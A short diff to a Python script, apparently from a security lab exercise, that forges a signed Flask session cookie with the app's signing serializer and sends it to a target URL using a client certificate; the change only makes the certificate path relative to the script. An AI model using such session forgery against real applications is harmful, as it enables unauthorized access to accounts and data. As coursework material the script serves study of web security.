@@ -1,4 +1,5 @@
 import requests
+import os
 import re
 from flask import Flask
 from flask.sessions import SecureCookieSessionInterface
@@ -21,7 +22,7 @@ serializer = SecureCookieSessionInterface().get_signing_serializer(app)
 signed_flask_token = serializer.dumps(PAYLOAD)
 
 session = requests.Session()
-session.cert = "../../z5437741.pem"
+session.cert = os.path.join(os.path.dirname(__file__), "../../z5437741.pem")
 session.cookies.set("session", signed_flask_token)
 
 response = session.get(TARGET_URL)
